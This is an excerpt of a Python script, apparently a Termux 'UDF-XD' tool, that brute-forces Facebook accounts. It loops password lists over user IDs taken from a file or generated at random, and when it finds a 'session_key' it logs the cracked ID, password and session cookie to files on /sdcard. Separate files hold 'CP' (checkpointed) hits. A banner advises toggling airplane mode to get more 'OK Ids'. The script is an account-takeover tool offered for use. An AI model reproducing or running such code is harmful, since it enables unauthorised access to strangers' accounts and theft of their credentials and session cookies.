...
\033[1;97m Notice : Use AIRPLANE MODE For More OK Ids :/
\033[1;93m=================================
'''
...
def menu():
        try:
              #  approval()
                        ...
                        if xd in ['1','01']:
                                clear();print(f'\033[1;32m[\033[1;31m✓\033[1;32m] EXAMPLE : /sdcard/UDF.txt ');linex()
...
def api1(ids,names,passlist):
    try:
        ...
        sys.stdout.write('\r\r\33[1;37m [\33[1;32mUDF-XD\33[1;37m] %s | \033[1;32mOK:-%s  \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        fn = names.split(' ')[0]
        try:
            ln = names.split(' ')[1]
        except:
        ...
        for pw in passlist:
            ...
            if 'session_key' in po:
                    ...
                    print('\r\r\033[1;32m [UDF-OK] '+uid+' √ '+pas)
                    p(f" \033[1;92m[\033[1;97mCOOKIE\033[1;92m] \033[1;97m{cookie}")
                    file_path = os.path.join(folder_path, 'UDF-FILE-OK.txt')
                    ...
                    open('/sdcard/UDF/UDF-FILE-OK-COOKIE.txt','a').write(uid+' √ '+pas+' >>> '+cookie+'\n')
    ...
    try:
        ...
        for pw in passlist:
            ...
            if 'session_key' in po:
                    ...
                    uid = str(po['error']['error_data']['uid'])
                    #print(f'\r\r\33[1m\33[1;35m [VENOM-CP] '+uid+' √ '+pas+'\033[1;97m')
                    file_path = os.path.join(folder_path, 'UDF-FILE-CP.txt')
                    with open(file_path, 'a') as file:
                        file.write(uid+' √ '+pas+'\n')
                    cps.append(uid)
                    break
...
def rndm1(uid,passlist):
        global loop
        global oks
        sys.stdout.write(f'\r\r{G}[{R}UDF-M1{G}]{G} %s {G}|{G} OK{G}|{G}CP{G} %s{G}|{R}%s '%(loop,len(oks),len(cps)));sys.stdout.flush()
        try:
                for pas in passlist:
                        ...
                        if 'session_key' in po:
                                        ...
                                        open('/sdcard/UDF-RANDOM-M1-OK.txt', 'a').write(uid+' | '+pas+' |-> '+coki+"\n")
                                        oks.append(uid)
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                        if 'y' in pcp:
                                                print(f'\r\r{G}[{Y}HATS-CP{G}]{Y} '+uid+' | '+pas+'\033[1;97m')
                                                open('/sdcard/UDF-CP.txt','a').write(uid+'|'+pas+'\n')
                                                cps.append(uid)
                                                break
                                        else:
                                                break
